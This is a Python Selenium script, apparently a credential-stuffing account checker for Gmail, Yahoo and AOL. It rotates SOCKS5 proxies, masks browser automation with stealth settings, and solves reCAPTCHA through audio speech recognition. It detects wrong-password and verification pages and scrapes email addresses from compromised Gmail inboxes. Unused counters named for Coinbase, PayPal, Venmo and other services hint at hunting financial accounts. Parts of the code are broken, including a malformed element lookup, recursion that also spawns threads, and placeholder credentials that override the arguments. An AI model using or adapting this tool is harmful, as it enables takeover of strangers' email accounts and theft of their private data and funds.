from selenium import webdriver 
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium_stealth import stealth
import time
import pyautogui
import requests
import shutil
import subprocess
from selenium.webdriver.common.proxy import Proxy, ProxyType
import urllib
import socks
import socket
import threading
import speech_recognition as sr
from pydub import AudioSegment

### PROXY ENABLE 1/0 ###
proxy = 0

### PROXYLIST INCREMENT ###
global PI
PI = 0

COINBASE = 0
PAYPAL = 0
CASHAPP = 0
VENMO = 0
ZELLE = 0
AMAZON = 0
UBER_EATS = 0
UBER = 0

def gmail_login(EMAIL, PASSWORD):
        global PI
        print(PI)
       
        options = webdriver.ChromeOptions()
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4430.212 Safari/537.36")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--ignore-ssl-errors=yes')
        options.add_argument('--ignore-certificate-errors')

        ### ENABLE PROXY CAPABILITY FOR CHROME DRIVER ###
        if proxy == 1:
                PROXY_LIST = open("socks5.txt", "r").readlines()[PI]
                print(PROXY_LIST)
    
                capabilities = webdriver.DesiredCapabilities.CHROME
                prox = Proxy()
                prox.proxy_type = ProxyType.MANUAL
                prox.socks_proxy = PROXY_LIST
                prox.socks_version = 5
                prox.add_to_capabilities(capabilities)
                driver = webdriver.Chrome(options=options, executable_path="./chromedriver", desired_capabilities=capabilities)

                proc = subprocess.Popen(['xdotool', 'getactivewindow'], stdout=subprocess.PIPE, encoding='utf8')
                WINDOW_ID = proc.stdout.readlines()[0].strip()
                print(WINDOW_ID)
        else:
                driver = webdriver.Chrome(options=options, executable_path="./chromedriver")
                 ### GET WINDOWS ID AND FOCUS ### 
                proc = subprocess.Popen(['xdotool', 'getactivewindow'], stdout=subprocess.PIPE, encoding='utf8')
                WINDOW_ID = proc.stdout.readlines()[0].strip()
                print(WINDOW_ID)
        
        driver.set_page_load_timeout(120)
        stealth(driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
                )

        try:
                        driver.get("http://m.gmail.com")
        except Exception:
                        print("proxy working?")
                        PI+=1
                        driver.close()
                        gmail_login(EMAIL, PASSWORD)
                        t = threading.Thread(target=gmail_login, args=(EMAIL, PASSWORD,))
                        t.start()
                        exit()
       
        #pyautogui.prompt('This lets the user type in a string and press OK.')
        #pyautogui.alert('This displays some text with an OK button.')
        fw = pyautogui.getInfo()
       
        ### ACTIVATE WINDOW ###
        subprocess.Popen(['xdotool', 'windowactivate', '{0}'.format(WINDOW_ID)], stdout=subprocess.PIPE, encoding='utf8')
        time.sleep(1)

        for LETTER in EMAIL:
                pyautogui.press("{0}".format(LETTER))
        pyautogui.press("enter")
        time.sleep(5)

        ### LOOK FOR EMAIL DOESNT EXISTS ELEMENT ###
        try:
                if driver.find_element_by_class_name("o6cuMc"):
                        print("Email Doesnt exists!")
                        return 0
        except Exception:
                pass
        try:
                if driver.find_element_by_class_name("ssl"):
                        print("ssl error")
                        PI+=1
                        driver.close()
                        gmail_login(EMAIL, PASSWORD)
                        t = threading.Thread(target=gmail_login, args=(EMAIL, PASSWORD,))
                        t.start()
        except Exception:
                pass
        time.sleep(5)

        ### LOOK FOR NETERROR PAGE TO SEE IF WE DIDNT CONNECT ###
        try:
                if driver.find_element_by_class_name("neterror"):
                        print("neterror")
                        PI+=1
                        driver.close()
                        gmail_login(EMAIL, PASSWORD)
                        t = threading.Thread(target=gmail_login, args=(EMAIL, PASSWORD,))
                        t.start()
                        exit()
        except Exception:
                pass
        
        ### CHECK IF WE HAVE TO ENTER A CAPTCHA BY SEARCHING FOR A CAPTCHA IMAGE ###
        if driver.find_element_by_id("captchaimg").get_attribute('src'):
                                        print("found +++++++++++++++")
                                        url = str(driver.find_element_by_("captchaimg").get_attribute('src'))
                                        response = requests.get(url, stream=True)
                                        with open('img.png', 'wb') as out_file:
                                                shutil.copyfileobj(response.raw, out_file)
                                                out_file.close()
                                        subprocess.Popen(["display", "img.png"])
                                        CAPTCHA = pyautogui.prompt('enter captcha you noob')
                                        time.sleep(5)
                                        for LETTER in CAPTCHA:
                                                pyautogui.press("{0}".format(LETTER))
                                        pyautogui.press("enter")
                                        time.sleep(120)          
        else:
                                ### ENTER OUR PASSWORD ###
                                 ### ACTIVATE WINDOW ###
                                subprocess.Popen(['xdotool', 'windowactivate', '{0}'.format(WINDOW_ID)], stdout=subprocess.PIPE, encoding='utf8')
                                for LETTER in PASSWORD:
                                        pyautogui.press("{0}".format(LETTER))
                                pyautogui.press("enter")
                                time.sleep(5)

                                ### CHECK IF THE PASSWORD WAS WRONG ###
                                try:
                                        if driver.find_element_by_xpath("//span[text()='Wrong password. Try again or click Forgot password to reset it.']"): 
                                                print("WRONG PASSWOR")
                                                return 0
                                except Exception:
                                        pass

                                ### CHECK IF THE ACCOUNT HAS TO GO THREW A VERIFICATION ### 
                                try:
                                        if driver.find_element_by_xpath("//span[text()='Verify it’s you']"):
                                                print("needs verification")
                                except Exception:
                                        pass
                                time.sleep(5)

                                ### CHECK IF GOOGLE ASKES IF YOU WANT HTML SITE OR NEW SITE AND SELECLT THE OLD HTML SITE ###
                                try:
                                        if driver.find_element_by_class_name("maia-button-secondary"):
                                                driver.find_element_by_class_name("maia-button-secondary").click()
                                                print("zxczxczxczxczxczxczxczxcz")
                                except Exception:
                                        pass

                                time.sleep(5)
                                ### CHECK FOR THE INBOX BUTTON TO KNOW IF WE ARE LOGGED IN ###
                                try:
                                        if driver.find_element_by_xpath("//a[@id='bnm']"):
                                                print("logged in")
                                                time.sleep(5)
                                                try:
                                                ### IF ELEMENT HAS ATTRIBUTE EMAIL PRINE EMAIL ##
                                                        MAX = 19
                                                        i = 0
                                                        for x in range(MAX):
                                                                e = driver.find_element_by_id('subj{0}'.format(i)).click()
                                                                MAIL = driver.find_elements_by_class_name('email')
                                                                for M in MAIL:
                                                                        print(M.text)
                                                                time.sleep(5)
                                                                driver.get("http://m.gmail.com")
                                                                i+=1
                                                                time.sleep(5)
                                                except Exception as e:
                                                        print(e)
                                                        pass
                                except Exception:
                                        pass
                                time.sleep(5)

def yahoo_login(EMAIL, PASSWORD):
        EMAIL = "USERNAME@gmail.com"
        PASSWORD = "PASSWORD"
        global PI
        print(PI)

        URL = "https://login.yahoo.com/?.lang=en-US&src=mobile&.done=https%3A%2F%2Fmobile.yahoo.com%2F&pspid=&activity=ybar-signin"
       
        options = webdriver.ChromeOptions()
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4430.212 Safari/537.36")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--ignore-ssl-errors=yes')
        options.add_argument('--ignore-certificate-errors')

        ### ENABLE PROXY CAPABILITY FOR CHROME DRIVER ###
        if proxy == 1:
                PROXY_LIST = open("socks5.txt", "r").readlines()[PI]
                print(PROXY_LIST)
    
                capabilities = webdriver.DesiredCapabilities.CHROME
                prox = Proxy()
                prox.proxy_type = ProxyType.MANUAL
                prox.socks_proxy = PROXY_LIST
                prox.socks_version = 5
                prox.add_to_capabilities(capabilities)
                driver = webdriver.Chrome(options=options, executable_path="./chromedriver", desired_capabilities=capabilities)

                proc = subprocess.Popen(['xdotool', 'getactivewindow'], stdout=subprocess.PIPE, encoding='utf8')
                WINDOW_ID = proc.stdout.readlines()[0].strip()
                print(WINDOW_ID)
        else:
                driver = webdriver.Chrome(options=options, executable_path="./chromedriver")
                 ### GET WINDOWS ID AND FOCUS ### 
                proc = subprocess.Popen(['xdotool', 'getactivewindow'], stdout=subprocess.PIPE, encoding='utf8')
                WINDOW_ID = proc.stdout.readlines()[0].strip()
                print(WINDOW_ID)
        
        driver.set_page_load_timeout(120)
        stealth(driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
                )

        try:
                        driver.get(URL)
        except Exception:
                        print("proxy working?")
                        PI+=1
                        driver.close()
                        gmail_login(EMAIL, PASSWORD)
                        t = threading.Thread(target=gmail_login, args=(EMAIL, PASSWORD,))
                        t.start()
                        exit()
        ### ACTIVATE WINDOW ###
        subprocess.Popen(['xdotool', 'windowactivate', '{0}'.format(WINDOW_ID)], stdout=subprocess.PIPE, encoding='utf8')
        time.sleep(1)

        for LETTER in EMAIL:
                pyautogui.press("{0}".format(LETTER))
        pyautogui.press("enter")
        time.sleep(5)
        try:
                if driver.find_element_by_tag_name("iframe"):
                        time.sleep(5)
                        driver.switch_to.frame(driver.find_element_by_tag_name("iframe"))
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@title='reCAPTCHA']"))
                        print("CAPTCHA")
                        time.sleep(5)
                        driver.find_element_by_xpath("//span[@id='recaptcha-anchor']").click()
                        time.sleep(5)
                        driver.switch_to.default_content()
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@id='recaptcha-iframe']"))
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@title='recaptcha challenge expires in two minutes']"))
                        time.sleep(2)
                        driver.find_element_by_xpath("//button[@title='Get an audio challenge']").click()
                        driver.switch_to.default_content()
                        time.sleep(2)
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@id='recaptcha-iframe']"))
                        time.sleep(2)
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@title='recaptcha challenge expires in two minutes']"))
                        time.sleep(5)
                        
                        CAPTCHA_TEXT = yahoo_get_captcha(driver)
                        pyautogui.press("tab")
                        for LETTER in CAPTCHA_TEXT:
                                pyautogui.press(LETTER)
                                time.sleep(1)
                        pyautogui.press("enter")
                        time.sleep(1)
                        pyautogui.press("tab")
                        time.sleep(1)
                        pyautogui.press("tab")
                        time.sleep(1)
                        pyautogui.press("tab")
                        time.sleep(1)
                        pyautogui.press("enter")
                        time.sleep(5)
                        driver.switch_to.default_content()
                        if driver.find_element_by_xpath("//div[@class='challenge-heading']"):
                                print("NEEDS VERIFICATION")
                                return 0      

                time.sleep(1)
        except Exception as e:
                print("NO CAPCHA")
                print(e)
                pass
        time.sleep(500)
        pyautogui.press("tab")
        pyautogui.press("tab")
        pyautogui.press("tab")
        pyautogui.press("enter")
        time.sleep(100)

def yahoo_get_captcha(driver):
### GET AUDIO FILE LINK FOR CAPTCHA ###
        print(driver.find_element_by_tag_name("audio").get_attribute("src"))
        rq = requests.get(driver.find_element_by_tag_name("audio").get_attribute("src"))
        file = open('voice_captcha.mp3', 'wb')
        file.write(rq.content)
        file.close()
        time.sleep(5)
        ### convert mp3 file to wav  ###
        sound = AudioSegment.from_mp3("./voice_captcha.mp3")
        sound.export("voice_captcha.wav", format="wav")
        file_audio = sr.AudioFile(r"voice_captcha.wav")
        # use the audio file as the audio source                                        
        r = sr.Recognizer()
        with file_audio as source:
                audio_text = r.record(source)
        print(type(audio_text))
        CAPTCHA_TEXT = r.recognize_google(audio_text)
        if CAPTCHA_TEXT == "NO CAPCHA":
                print("RELOADING CAPTCHA")
                driver.find_element_by_xpath("//button[@id='recaptcha-reload-button']").click()
                yahoo_get_captcha(driver)
        return CAPTCHA_TEXT

def aol_login(USERNAME, PASSWORD):
        EMAIL = "username@aol.com"
        PASSWORD = "passwordhere"
        global PI
        print(PI)

        URL = "https://login.aol.com/"
       
        options = webdriver.ChromeOptions()
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4430.212 Safari/537.36")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--ignore-ssl-errors=yes')
        options.add_argument('--ignore-certificate-errors')

        ### ENABLE PROXY CAPABILITY FOR CHROME DRIVER ###
        if proxy == 1:
                PROXY_LIST = open("socks5.txt", "r").readlines()[PI]
                print(PROXY_LIST)
    
                capabilities = webdriver.DesiredCapabilities.CHROME
                prox = Proxy()
                prox.proxy_type = ProxyType.MANUAL
                prox.socks_proxy = PROXY_LIST
                prox.socks_version = 5
                prox.add_to_capabilities(capabilities)
                driver = webdriver.Chrome(options=options, executable_path="./chromedriver", desired_capabilities=capabilities)

                proc = subprocess.Popen(['xdotool', 'getactivewindow'], stdout=subprocess.PIPE, encoding='utf8')
                WINDOW_ID = proc.stdout.readlines()[0].strip()
                print(WINDOW_ID)
        else:
                driver = webdriver.Chrome(options=options, executable_path="./chromedriver")
                 ### GET WINDOWS ID AND FOCUS ### 
                proc = subprocess.Popen(['xdotool', 'getactivewindow'], stdout=subprocess.PIPE, encoding='utf8')
                WINDOW_ID = proc.stdout.readlines()[0].strip()
                print(WINDOW_ID)
        
        driver.set_page_load_timeout(120)
        stealth(driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
                )

        try:
                        driver.get(URL)
        except Exception:
                        print("proxy working?")
                        PI+=1
                        driver.close()
                        gmail_login(EMAIL, PASSWORD)
                        t = threading.Thread(target=gmail_login, args=(EMAIL, PASSWORD,))
                        t.start()
                        exit()
        ### ACTIVATE WINDOW ###
        subprocess.Popen(['xdotool', 'windowactivate', '{0}'.format(WINDOW_ID)], stdout=subprocess.PIPE, encoding='utf8')
        time.sleep(1)

        for LETTER in EMAIL:
                pyautogui.press("{0}".format(LETTER))
        pyautogui.press("enter")
        time.sleep(5)
        try:
                if driver.find_element_by_xpath("//p[@id='username-error']"):
                        print("EMAIL DOESNT EXIST'S")
                        time.sleep(5)
                        driver.switch_to.frame(driver.find_element_by_tag_name("iframe"))
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@title='reCAPTCHA']"))
                        print("CAPTCHA")
                        time.sleep(5)
                        driver.find_element_by_xpath("//span[@id='recaptcha-anchor']").click()
                        time.sleep(5)
                        driver.switch_to.default_content()
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@id='recaptcha-iframe']"))
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@title='recaptcha challenge expires in two minutes']"))
                        time.sleep(2)
                        driver.find_element_by_xpath("//button[@title='Get an audio challenge']").click()
                        driver.switch_to.default_content()
                        time.sleep(2)
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@id='recaptcha-iframe']"))
                        time.sleep(2)
                        driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@title='recaptcha challenge expires in two minutes']"))
                        time.sleep(5)
                        
                        CAPTCHA_TEXT = yahoo_get_captcha(driver)
                        pyautogui.press("tab")
                        for LETTER in CAPTCHA_TEXT:
                                pyautogui.press(LETTER)
                                time.sleep(1)
                        pyautogui.press("enter")
                        time.sleep(1)
                        pyautogui.press("tab")
                        time.sleep(1)
                        pyautogui.press("tab")
                        time.sleep(1)
                        pyautogui.press("tab")
                        time.sleep(1)
                        pyautogui.press("enter")
                        time.sleep(5)
                        driver.switch_to.default_content()
                        if driver.find_element_by_xpath("//div[@class='challenge-heading']"):
                                print("NEEDS VERIFICATION")
                                return 0      

                time.sleep(1)
        except Exception as e:
                print("NO CAPCHA")
                print(e)
                pass
        time.sleep(500)
        pyautogui.press("tab")
        pyautogui.press("tab")
        pyautogui.press("tab")
        pyautogui.press("enter")
        time.sleep(100)
